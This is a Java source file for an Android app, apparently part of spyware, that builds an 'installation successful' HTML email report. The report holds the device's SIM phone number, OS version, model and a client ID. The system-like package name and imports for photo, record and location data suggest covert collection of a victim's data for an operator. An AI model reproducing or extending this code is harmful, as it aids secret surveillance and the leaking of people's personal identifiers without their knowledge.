package com.android.db;

import java.util.List;

import javax.mail.Multipart;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMultipart;

import android.content.Context;
import android.os.Build;

import com.android.pojo.Location;
import com.android.pojo.Photo;
import com.android.pojo.Record;
import com.android.utils.Utils;

public class WelComeMailBody implements MailBody {

	public String body = "<html><style>table.gridtable {	font-family: verdana,arial,sans-serif;	font-size:11px;	color:#333333;	border-width: 1px;	border-color: #666666;	border-collapse: collapse;width:100%}table.gridtable th {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #dedede;}table.gridtable td {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #ffffff;}</style><body>";
	public String bodyend = "</body></html>";
	private Context context;
	private List<Photo> lphoto;
	private List<Record> lrecord;;
	private List<Location> lloc;

	public WelComeMailBody(Context context) {
		this.context = context;
	}

	@Override
	public Multipart getMultipart() {
		// TODO Auto-generated method stub
		Multipart multipart = null;
		try {
			StringBuffer html = new StringBuffer();
			html.append(body);
			html.append("<div style='font-size:13px;'>本机号码(SIM卡号码)"
					+ Utils.getnum(context) + " ,系统版本" + Build.VERSION.SDK_INT
					+ " ,手机型号" + Build.MODEL + "--" + Build.PRODUCT + " "
					+ Utils.getStringConfig(context, "clientid", "")
					+ "</div><br/>");
			
			html.append(bodyend);
			html.append("安装成功");
			html.append(bodyend);
			multipart = new MimeMultipart();
			MimeBodyPart htmlbody = new MimeBodyPart();
			htmlbody.setContent(html.toString(), "text/html; charset=utf-8");
			multipart.addBodyPart(htmlbody);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			multipart = null;
		}
		return multipart;

	}

	@Override
	public boolean DeleteData() {
		// TODO Auto-generated method stub
		return false;
	}



}
